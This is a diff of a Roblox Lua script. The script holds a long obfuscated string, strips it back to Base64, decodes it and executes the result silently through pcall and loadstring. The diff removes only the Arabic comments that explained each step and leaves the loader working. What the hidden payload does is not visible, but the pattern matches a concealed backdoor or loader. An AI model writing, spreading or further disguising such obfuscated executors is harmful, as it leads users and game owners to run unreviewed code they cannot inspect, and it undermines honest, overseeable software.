@@ -1,11 +1,10 @@
 local HttpService = game:GetService("HttpService")
 
--- السكربت المشفر بالكامل مع الرموز
 local encoded = [[
 $C#+m{}x@)v&%Y,&2-=F@;s-=I,<F>[B^$s,^Y_+X!,l+[l*@c[*n{^M<:g{,P![S>%B!*n;*Y-}W=;1,!l;<O#;k,.d<^l@$d{!F<-N&_l[@c=+n_<Z{)p_<Y*:2_%U.$o/,I=@l>-B}/s)_Y>>X;_l/.l>%c@#n.)M?/i#@K<.Q#$p=#s>,b,}2,$N}_h%/b^!C-]B/>Q(+b(_G,?F)$5-)Z}>X[-I;_g+:P;>S,?B>,Q%%b;-G<_F:}5&!Z(@X&]J{<z;,L(&k?@x_;v<[Y$,2@:F#[s$@U.?G<,x::h#,e&?W*=V^]y,{C/@m#@x+}v]^Y.+2::F*>s<(I*-F:)V&:z%[Z,}X]%J)-J*@b)$n<}B_?1&&d#}F.+N?:l*=c*(n,^Z^#p-[Y^$2*{U=>g:*P!:S),B%<n?,Y(}W&&1+/l/[O(:k,?d,*l$-d},F:%N(?l+?c*{n(]Z_&p(-Y;]2@!U#^o_/I$!l+]V$.z]%Z)%X/{J?$J.{b.-n))B?^1;,d/@F}{N&!l/]c{/n;+Z^;p.%Y?^2#+U%[i=&K!<Q)]p={s([b)-2+.N/]h]=b,*C<_B__S>*d)(W=)5_@T$/Z.-X^.J^;2;+a=_W_:N}&l{,I_[D;,0_;g*_Z>:2@}F$$t==Z$]T>,p-$H$:Z$@X?=R).T;*Z]%X:#J-*2[;a%,W=&N)=l.{K:@C],J,,S_!d].W!{5:-T_?Z!-X}!J>#2*,a$%W=$N._l=&I+_i?*k>_K#^C:#i+}0<<t}}I*_E-/d/<V)>S^(S#(w./g,;Q##n*/V%#0%_d($G.,9@/u]-c&#y.$w!%g)}R/>V,@N.)Q(=L:-C}=B[)O>+b:=0{^N^%s%.a>^X!:A:[s=_I=]E}&Z:<h_,b!$G[,w_/g@+U=%H*@J-@v,]d!?G&:V>#j:-d.<G!=l@-v@#b)/i,*A)#o,^2$.Y;^X{&Z+]g&<9.;i_%n#<2@$Y!(Y-[g/+2$!K>?f>#Z-}h=@N@.i=&z$}2>+Y&}P){Y[(s[.d{#i#}o)<2/>K/>o!?g){2*}K:{f<-Z/#h@!N<{i^>j__2-{L[_X$#Z={h(&N))m$<K-_K>&Q-+p%{w_!c(_m#*l?+u_{d$/C-(g/?i$^U_)2^%N}-y<=a%/X,.B,]0.>I^)F;,J_)1){b:#m)!5]@p}}b:(m;*c_?u{(L#[i@%4)]i]<K=]Q-!o#-=@'
 ]]
 
--- دالة لفك الرموز وإرجاع Base64 الأصلي
+  
 local function decodeSymbols(s)
     local t = {}
     for c in s:gmatch("[A-Za-z0-9+/=]") do
@@ -14,7 +13,7 @@ local function decodeSymbols(s)
     return table.concat(t)
 end
 
--- تشغيل السكربت
+ 
 pcall(function()
     local decodedBase64 = decodeSymbols(encoded)
     loadstring(HttpService:Base64Decode(decodedBase64))()
